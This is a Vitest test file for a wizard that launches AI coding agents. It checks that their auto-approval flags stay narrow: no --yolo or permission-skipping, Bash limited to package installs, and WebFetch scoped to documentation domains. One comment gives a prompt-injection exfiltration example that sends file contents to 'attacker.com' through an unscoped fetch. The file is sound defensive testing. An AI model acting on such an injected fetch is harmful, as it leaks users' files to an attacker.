import { afterEach, describe, expect, it, vi } from 'vitest';
import { clackStub } from '../test/helpers.js';
import type { StepMarker } from './telemetry-marker.js';
import type { LaunchContext } from './types.js';

/**
 * The adapters are where the wizard's promise to the user becomes actual
 * argv. The pre-handoff gate says what the run auto-approves; these flags
 * are what it actually approves, so they're asserted literally.
 */

const clack = clackStub();
vi.mock('@clack/prompts', () => clack);

interface RunOpts {
  binaryPath: string;
  args: string[];
  cwd: string;
  promptOnStdin?: string;
  stdout?: 'inherit' | 'pipe';
  onStdoutLine?: (line: string) => void;
}

const h = vi.hoisted(() => ({
  runTerminalAgent: vi.fn<(opts: RunOpts) => Promise<number>>(async () => 0),
  which: vi.fn<(cmd: string) => Promise<string | null>>(async () => null),
  firstExistingPath: vi.fn<(paths: string[]) => string | null>(() => null),
  macAppPath: vi.fn<(name: string) => string | null>(() => null),
  openAppAtDir: vi.fn<(opts: Record<string, unknown>) => Promise<void>>(async () => undefined),
  clipboardWrite: vi.fn<(text: string) => Promise<void>>(async () => undefined),
  printAgentText: vi.fn<(text: string) => void>(),
  printAgentAction: vi.fn<(text: string) => void>(),
}));

vi.mock('./helpers.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('./helpers.js')>();
  return {
    ...actual,
    runTerminalAgent: h.runTerminalAgent,
    which: h.which,
    firstExistingPath: h.firstExistingPath,
    macAppPath: h.macAppPath,
    openAppAtDir: h.openAppAtDir,
  };
});
vi.mock('./output.js', () => ({
  printAgentText: h.printAgentText,
  printAgentAction: h.printAgentAction,
}));
vi.mock('clipboardy', () => ({ default: { write: h.clipboardWrite } }));

const { claudeCode } = await import('./claude-code.js');
const { codexCli } = await import('./codex.js');
const { geminiCli } = await import('./gemini.js');
const { claudeDesktop, cursor, vscode, windsurf, zed } = await import('./apps.js');

const TERMINAL = [claudeCode, codexCli, geminiCli];
const APPS = [cursor, windsurf, vscode, zed, claudeDesktop];

function ctx(overrides: Partial<LaunchContext> = {}): LaunchContext {
  return {
    prompt: 'install the snippet',
    cwd: '/work/app',
    binaryPath: '/bin/agent',
    debug: false,
    ...overrides,
  };
}

/** The args array of the nth runTerminalAgent call. */
const callOf = (n = 0): RunOpts => h.runTerminalAgent.mock.calls[n][0];
const argsOf = (n = 0): string[] => callOf(n).args;

afterEach(() => vi.clearAllMocks());

// ---------------------------------------------------------------------------

/**
 * `autonomy` is the sentence shown in the consent gate, and the flags below
 * are what that sentence is promising. A flag change that widens what the
 * agent may do without touching the copy is exactly the drift to catch.
 */
describe('the autonomy contract', () => {
  it.each(TERMINAL.map((a) => [a.id, a] as const))('%s declares what it auto-approves', (_id, a) => {
    expect(a.autonomy?.trim()).toBeTruthy();
    expect(a.kind).toBe('terminal');
  });

  it.each(APPS.map((a) => [a.id, a] as const))('%s is a handoff and claims no autonomy', (_id, a) => {
    expect(a.kind).toBe('app');
    expect(a.autonomy).toBeUndefined();
  });

  it('runs Gemini with edit approval only, never --yolo', async () => {
    await geminiCli.launch(ctx());
    const args = argsOf();

    expect(args).toEqual(['--approval-mode', 'auto_edit', '-p', 'install the snippet']);
    expect(args).not.toContain('--yolo');
    expect(geminiCli.autonomy).toMatch(/shell commands are not auto-approved/);
  });

  it('runs Codex non-interactively inside its workspace sandbox', async () => {
    await codexCli.launch(ctx());

    expect(argsOf()).toEqual(['exec', '--full-auto', 'install the snippet']);
    expect(codexCli.autonomy).toMatch(/sandbox/);
  });

  it('runs Claude Code accepting edits, with the prompt on stdin', async () => {
    await claudeCode.launch(ctx());
    const call = callOf();

    expect(call.args).toContain('-p');
    expect(call.args).toContain('--permission-mode');
    expect(call.args[call.args.indexOf('--permission-mode') + 1]).toBe('acceptEdits');
    expect(call.promptOnStdin).toBe('install the snippet');
    expect(call.args).not.toContain('--dangerously-skip-permissions');
  });

  /**
   * An unscoped WebFetch is an exfiltration channel under prompt injection:
   * fetch `https://attacker.com/?data=<file contents>`. The domain scope is
   * what closes that, so it is asserted rather than assumed.
   */
  it('scopes Claude Code’s WebFetch to the Fullstory doc domains', async () => {
    await claudeCode.launch(ctx());
    const tools = argsOf()[argsOf().indexOf('--allowedTools') + 1].split(',');
    const webFetch = tools.filter((t) => t.startsWith('WebFetch'));

    expect(webFetch).toEqual([
      'WebFetch(domain:subtext.fullstory.com)',
      'WebFetch(domain:developer.fullstory.com)',
    ]);
    expect(tools).not.toContain('WebFetch');
  });

  it('pre-authorizes only dependency installs among the bash tools', async () => {
    await claudeCode.launch(ctx());
    const tools = argsOf()[argsOf().indexOf('--allowedTools') + 1].split(',');

    expect(tools.filter((t) => t.startsWith('Bash'))).toEqual([
      'Bash(npm install:*)',
      'Bash(pnpm add:*)',
      'Bash(yarn add:*)',
      'Bash(bun add:*)',
    ]);
  });

  it.each(TERMINAL.map((a) => [a.id, a] as const))(
    '%s runs in the target directory and reports its exit code',
    async (_id, agent) => {
      h.runTerminalAgent.mockResolvedValueOnce(7);

      const result = await agent.launch(ctx({ cwd: '/elsewhere' }));

      expect(callOf().cwd).toBe('/elsewhere');
      expect(result).toEqual({ mode: 'ran', exitCode: 7 });
    },
  );
});

// ---------------------------------------------------------------------------

describe('terminal agent detection', () => {
  it('finds Claude Code on PATH', async () => {
    h.which.mockResolvedValueOnce('/opt/homebrew/bin/claude');
    expect(await claudeCode.detect()).toMatchObject({
      binaryPath: '/opt/homebrew/bin/claude',
      detail: '/opt/homebrew/bin/claude',
    });
  });

  // Claude Code's local installer doesn't always land on PATH.
  it('falls back to the known Claude Code install locations', async () => {
    h.which.mockResolvedValueOnce(null);
    h.firstExistingPath.mockReturnValueOnce('/home/dev/.claude/local/claude');

    expect(await claudeCode.detect()).toMatchObject({
      binaryPath: '/home/dev/.claude/local/claude',
    });
  });

  it('returns null when Claude Code is nowhere', async () => {
    h.which.mockResolvedValueOnce(null);
    h.firstExistingPath.mockReturnValueOnce(null);
    expect(await claudeCode.detect()).toBeNull();
  });

  it.each([
    ['codex', codexCli],
    ['gemini', geminiCli],
  ] as const)('%s detects from PATH alone', async (cmd, agent) => {
    h.which.mockResolvedValueOnce(`/usr/local/bin/${cmd}`);
    expect(await agent.detect()).toMatchObject({ binaryPath: `/usr/local/bin/${cmd}` });

    h.which.mockResolvedValueOnce(null);
    expect(await agent.detect()).toBeNull();
  });
});

// ---------------------------------------------------------------------------

/**
 * Claude Code streams newline-delimited JSON. The wizard parses it to show
 * progress, pull telemetry markers out, and avoid printing the final summary
 * twice.
 */
describe('Claude Code stream parsing', () => {
  /** Run a launch, feeding it the given stream-json lines. */
  async function stream(lines: unknown[], overrides: Partial<LaunchContext> = {}) {
    h.runTerminalAgent.mockImplementationOnce(async (opts) => {
      for (const line of lines) {
        opts.onStdoutLine?.(typeof line === 'string' ? line : JSON.stringify(line));
      }
      return 0;
    });
    return claudeCode.launch(ctx(overrides));
  }

  const assistant = (...content: unknown[]) => ({ type: 'assistant', message: { content } });
  const text = (t: string) => ({ type: 'text', text: t });

  it('prints the agent’s prose', async () => {
    await stream([assistant(text('Found a Next.js app.'))]);
    expect(h.printAgentText).toHaveBeenCalledWith('Found a Next.js app.');
  });

  it('skips blank lines and unparseable output', async () => {
    await stream(['', '   ', 'not json at all']);
    expect(h.printAgentText).not.toHaveBeenCalled();
  });

  it('echoes unparseable lines to stderr only under --debug', async () => {
    const err = vi.spyOn(console, 'error').mockImplementation(() => {});

    await stream(['not json'], { debug: false });
    expect(err).not.toHaveBeenCalled();

    await stream(['not json'], { debug: true });
    expect(err).toHaveBeenCalled();
  });

  it('reports tool use as an action and an event', async () => {
    const onEvent = vi.fn();
    await stream(
      [assistant({ type: 'tool_use', name: 'Edit', input: { file_path: '/work/app/index.html' } })],
      { onEvent },
    );

    expect(h.printAgentAction).toHaveBeenCalledWith('Edit: /work/app/index.html');
    expect(onEvent).toHaveBeenCalledWith('agent_tool_use', { tool: 'Edit' });
  });

  it.each([
    ['file_path wins', { file_path: '/a', path: '/b', command: 'ls' }, 'Tool: /a'],
    ['then path', { path: '/b', command: 'ls' }, 'Tool: /b'],
    ['then command', { command: 'npm install', pattern: 'x' }, 'Tool: npm install'],
    ['then pattern', { pattern: 'TODO', url: 'https://x' }, 'Tool: TODO'],
    ['then url', { url: 'https://x' }, 'Tool: https://x'],
    ['nothing to show', {}, 'Tool'],
  ])('describes a tool by %s', async (_label, input, expected) => {
    await stream([assistant({ type: 'tool_use', name: 'Tool', input })]);
    expect(h.printAgentAction).toHaveBeenCalledWith(expected);
  });

  it('truncates a long command to keep the action line readable', async () => {
    const command = 'echo '.repeat(40);
    await stream([assistant({ type: 'tool_use', name: 'Bash', input: { command } })]);

    const shown = String(h.printAgentAction.mock.calls[0][0]);
    expect(shown.length).toBeLessThanOrEqual('Bash: '.length + 80);
  });

  it('pulls telemetry markers out of the prose before printing it', async () => {
    const onTelemetry = vi.fn<(marker: StepMarker) => void>();
    await stream(
      [
        assistant(
          text(
            'Installing.\n__SUBTEXT_TELEMETRY__ {"step":"install","outcome":"success"}\nDone.',
          ),
        ),
      ],
      { onTelemetry },
    );

    expect(onTelemetry).toHaveBeenCalledWith({
      step: 'install',
      outcome: 'success',
      metadata: undefined,
    });
    expect(h.printAgentText).toHaveBeenCalledWith('Installing.\nDone.');
  });

  it('prints nothing when a block was only a marker', async () => {
    const onTelemetry = vi.fn<(marker: StepMarker) => void>();
    await stream([assistant(text('__SUBTEXT_TELEMETRY__ {"step":"plan","outcome":"success"}'))], {
      onTelemetry,
    });

    expect(onTelemetry).toHaveBeenCalledOnce();
    expect(h.printAgentText).not.toHaveBeenCalled();
  });

  /**
   * The result event normally repeats the final assistant message. Showing
   * it again would print the same summary twice, so the note is only for a
   * result that differs — an error subtype, say.
   */
  it('suppresses a result that just repeats the last message', async () => {
    await stream([assistant(text('All done.')), { type: 'result', result: 'All done.' }]);
    expect(clack.note).not.toHaveBeenCalled();
  });

  it('shows a result that differs from what was streamed', async () => {
    await stream([
      assistant(text('Working…')),
      { type: 'result', subtype: 'error_max_turns', result: 'Ran out of turns.' },
    ]);

    expect(clack.note).toHaveBeenCalledWith('Ran out of turns.', 'Claude Code result');
  });

  it('strips markers from the result too', async () => {
    const onTelemetry = vi.fn<(marker: StepMarker) => void>();
    await stream(
      [{ type: 'result', result: 'Summary.\n__SUBTEXT_TELEMETRY__ {"step":"install"}' }],
      { onTelemetry },
    );

    expect(clack.note).toHaveBeenCalledWith('Summary.', 'Claude Code result');
  });
});

// ---------------------------------------------------------------------------

describe('GUI app handoffs', () => {
  describe('detection', () => {
    it('returns null when neither a CLI nor a bundle is present', async () => {
      expect(await cursor.detect()).toBeNull();
    });

    it('detects from the CLI launcher alone', async () => {
      h.which.mockResolvedValueOnce('/usr/local/bin/cursor');
      expect(await cursor.detect()).toMatchObject({
        binaryPath: '/usr/local/bin/cursor',
        opensFolder: true,
      });
    });

    // Claiming a bundle that isn't there would make a later `open -a` miss.
    it('only claims the bundle name when the bundle really exists', async () => {
      h.which.mockResolvedValueOnce('/usr/local/bin/cursor');
      h.macAppPath.mockReturnValueOnce(null);
      expect((await cursor.detect())?.macAppName).toBeUndefined();

      h.which.mockResolvedValueOnce(null);
      h.macAppPath.mockReturnValueOnce('/Applications/Cursor.app');
      expect((await cursor.detect())?.macAppName).toBe('Cursor');
    });

    it('detects Claude Desktop from its bundle, and marks it folder-less', async () => {
      h.macAppPath.mockReturnValueOnce('/Applications/Claude.app');
      expect(await claudeDesktop.detect()).toMatchObject({
        macAppName: 'Claude',
        opensFolder: false,
        binaryPath: undefined,
      });
    });
  });

  describe('launch', () => {
    it('copies the prompt, opens the app at the project, and says where to paste', async () => {
      const result = await cursor.launch(ctx());

      expect(h.clipboardWrite).toHaveBeenCalledWith('install the snippet');
      expect(h.openAppAtDir).toHaveBeenCalledWith({
        binaryPath: '/bin/agent',
        macAppName: 'Cursor',
        dir: '/work/app',
      });
      expect(result).toMatchObject({ mode: 'handoff', clipboardHoldsPrompt: true });
      expect(result.followUp?.join('\n')).toMatch(/Cmd\+I/);
    });

    // `open -a Claude <path>` isn't how Claude Desktop launches, so a
    // folder-less app must not be handed a directory.
    it('withholds the directory from an app that does not open folders', async () => {
      await claudeDesktop.launch(ctx());
      expect(h.openAppAtDir).toHaveBeenCalledWith(expect.objectContaining({ dir: undefined }));
    });

    it('reports the prompt inline when the clipboard is unavailable', async () => {
      h.clipboardWrite.mockRejectedValueOnce(new Error('no clipboard'));

      const result = await cursor.launch(ctx());

      expect(result.clipboardHoldsPrompt).toBe(false);
      expect(result.followUp?.join('\n')).toMatch(/Clipboard copy failed/);
      expect(clack.log.message).toHaveBeenCalledWith('install the snippet');
    });

    it('tells the user to open the app themselves when the launch fails', async () => {
      h.openAppAtDir.mockRejectedValueOnce(new Error('no such app'));

      const result = await cursor.launch(ctx());

      expect(result.mode).toBe('handoff');
      expect(result.followUp?.[0]).toMatch(/Couldn't launch Cursor automatically/);
      expect(result.followUp?.[0]).toContain('/work/app');
    });

    it('never throws, even when both the clipboard and the launch fail', async () => {
      h.clipboardWrite.mockRejectedValueOnce(new Error('nope'));
      h.openAppAtDir.mockRejectedValueOnce(new Error('nope'));

      await expect(cursor.launch(ctx())).resolves.toMatchObject({ mode: 'handoff' });
    });

    it.each(APPS.map((a) => [a.id, a] as const))(
      '%s explains where to paste and that the agent will ask before editing',
      async (_id, agent) => {
        const result = await agent.launch(ctx());
        const followUp = result.followUp?.join('\n') ?? '';

        expect(followUp).toMatch(/paste/i);
        expect(followUp).toMatch(/ask for approval before changing code/);
      },
    );
  });
});
